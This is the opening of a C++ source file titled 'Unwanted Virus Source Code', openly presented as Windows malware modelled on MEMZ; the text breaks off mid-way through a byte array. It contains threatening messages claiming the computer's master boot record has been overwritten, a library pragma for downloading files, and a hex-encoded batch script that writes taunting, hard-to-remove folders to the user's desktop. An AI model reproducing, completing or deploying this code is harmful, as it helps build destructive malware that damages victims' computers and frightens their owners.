/*-------------------------------------------+
|                                            |
|   Unwanted Virus Source Code               |
|                                            |
|   (C) BenjaminFretez 2021.                 |
|                                            |
+--------------------------------------------*/

/* This malware is based on the MEMZ malware */

/* include files */
#include <windows.h> // Required for WINAPI
#include <iostream> // Required for input-output
#include <fstream> // Required for files
#include <stdio.h>

/* required for downloading files*/
#pragma comment (lib, "urlmon.lib")

using namespace std;

DWORD wb;

/* files content */
const unsigned char msg[] = "Hello! You have ran the called Úñåáñþéd ßí®ú’ (Unwanted Virus)\r\n\r\nYour computer is now done for anyway,\r\nkilling Unwanted.exe process will not do anything, just it rewrited the MBR...\r\nYour eta is 2 minutes, THE TIME IS RUNNING! =)";
const size_t msg_len = sizeof(msg);

const unsigned char diem[] = "ÜÓÚ ÑÉÉÐ ÞÓ ÐÍÉÉÉÉ²¼2ð¤ú®¥½ö’«   ÜÓÚ ÑÉEÐ TÓ ÐÍÉ YOU NEED TO DIEÉÉÉ aáaááá €€¼€³¤²¤¤¬²¬\r\nïñ§tág®áµ@Endersshow@#RT#$tþ¤³þ³å³äs³®É F3¤€Þ³TÅ®¤ÅÞ€ÜÉÜWÞÜÉ€Ü¤\r\n WHY ARE YOU RUNNING? WHY ARE YOU RUNNING? ÁÄÉ³ÁÅÅÁÅAÁÄÉ®Ü¼Ú¼½Í¾»¬»«¥®²³ÞÄ³®";
const size_t die_len = sizeof(diem);

const unsigned char lastm[] = "ÜÓÚ\n YOU COMPUTER WILL DIE IN 10 SECONDS €¤ÜÞÅ³®²®¤³Þ\r\n³€ÞÜ¤Wé nééð á ñéwc ímputyer guys¼€ÚÉ6YE³\r\n®²¤Þ¤€Ü¼Ú€Time is over, you killed it!¤Þ¤€Þ¤\r\n³é³å²€Þ¤";
const size_t last_len = sizeof(lastm);

const unsigned char escapem[] = "Hey! The escape is behind you,\r\nLook behind you please, Is there!!";
const size_t escape_len = sizeof(escapem);


const unsigned char batm[] = { 0xEF, 0xBB, 0xBF, 0x40, 0x65, 0x63, 0x68, 0x6F, 0x20, 0x6F, 0x66, 0x66, 0x0D, 0x0A, 0x63, 0x64,
0x20, 0x25, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x25, 0x20, 0x26, 0x20,
0x65, 0x63, 0x68, 0x6F, 0x2E, 0x20, 0x0D, 0x0A, 0x63, 0x64, 0x20, 0x25, 0x75, 0x73, 0x65, 0x72,
0x70, 0x72, 0x6F, 0x66, 0x69, 0x6C, 0x65, 0x25, 0x5C, 0x64, 0x65, 0x73, 0x6B, 0x74, 0x6F, 0x70,
0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x6C, 0x6F, 0x6C, 0x2C, 0x20, 0x79, 0x6F,
0x75, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F, 0x74, 0x20, 0x72, 0x65, 0x6D, 0x6F, 0x76, 0x65, 0x20,
0x6D, 0x65, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22, 0x43, 0x3A, 0x20, 0x6A, 0x61,
0x6A, 0x61, 0x2C, 0x20, 0x6E, 0x6F, 0x20, 0x6D, 0x65, 0x20, 0x70, 0x75, 0x65, 0x64, 0x65, 0x73,
0x20, 0x71, 0x75, 0x69, 0x74, 0x61, 0x72, 0x20, 0x5C, 0x22, 0x0D, 0x0A, 0x6D, 0x64, 0x20, 0x22,
0x43, 0x3A, 0x20, 0xD0, 0xBB, 0xD0, 0xBE, 0xD0, 0xBB, 0x2C, 0x20, 0xD1, 0x82, 0xD1, 0x8B, 0x20,
0xD0, 0xBD, 0xD0, 0xB5, 0x20, 0xD0, 0xBC, 0xD0, 0xBE, 0xD0, 0xB6, 0xD0, 0xB5, 0xD1, 0x88, 0xD1,
0x8C, 0x20, 0xD0, 0xBC, 0xD0, 0xB5, 0xD0, 0xBD, 0xD1, 0x8F, 0x20, 0xD1, 0x83, 0xD0, 0xB4, 0xD0,
0xB0, 0xD0, 0xBB, 0xD0, 0xB8, 0xD1, 0x82, 0xD1, 0x8C, 0x20, 0x5C, 0x22, 0x20, 0x0D, 0x0A, 0x6D,
